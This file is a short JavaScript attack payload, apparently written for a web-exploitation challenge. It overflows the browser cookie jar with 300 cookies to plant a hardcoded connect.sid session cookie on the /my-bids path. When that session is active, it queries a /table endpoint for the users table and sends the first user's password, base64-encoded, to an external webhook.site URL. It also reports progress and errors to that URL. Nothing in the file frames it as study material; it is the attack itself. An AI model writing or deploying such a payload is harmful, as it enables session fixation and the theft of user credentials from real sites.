const cookieJar = 300
cookiez = "connect.sid=s%3AbJa6-wIYxs1_cXegKmta30-wntgYvmWU.MmDtmOBBM2qOy8a3BI91MovdmRIWrUSYxXXRCLc9xiM"
if (document.cookie == cookiez) {
  fetch('https://webhook.site/71c8eac2-6350-4f8b-8af2-cc8cfef4035c?begin=true')

  sendQuery();
  fetch('https://webhook.site/71c8eac2-6350-4f8b-8af2-cc8cfef4035c?begin=false')

}
else {
  for (let i = 0; i < cookieJar;i++){
    document.cookie = "cookie"+i+"=a; Secure"
  }

  for (let i = 0; i < cookieJar;i++){
    document.cookie = "cookie" + i + "=a; expires=Thu, 01 Jan 1970 00:00:01 GMT";
  }

  document.cookie = cookiez + ";path=/my-bids; expires=" + new Date(Date.now() + 24 * 60 * 60 * 1000).toUTCString();

}


async function sendQuery() {
  try {
    const response = await fetch("/table", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ tableName: "users" }),
        });

    const data = await response.json();

    if (data.success) {
      fetch('https://webhook.site/71c8eac2-6350-4f8b-8af2-cc8cfef4035c?x=' + btoa(data.results[0].password))
      console.log('Query Results:', data.results);
    } else {
      fetch('https://webhook.site/71c8eac2-6350-4f8b-8af2-cc8cfef4035c?error=' + btoa(data))
      console.error('Query Error:', data.message);
    }
  } catch (error) {
    fetch('https://webhook.site/71c8eac2-6350-4f8b-8af2-cc8cfef4035c?catch=' + btoa(error))
    console.error('Request Failed:', error);
  }
}

// Example usage: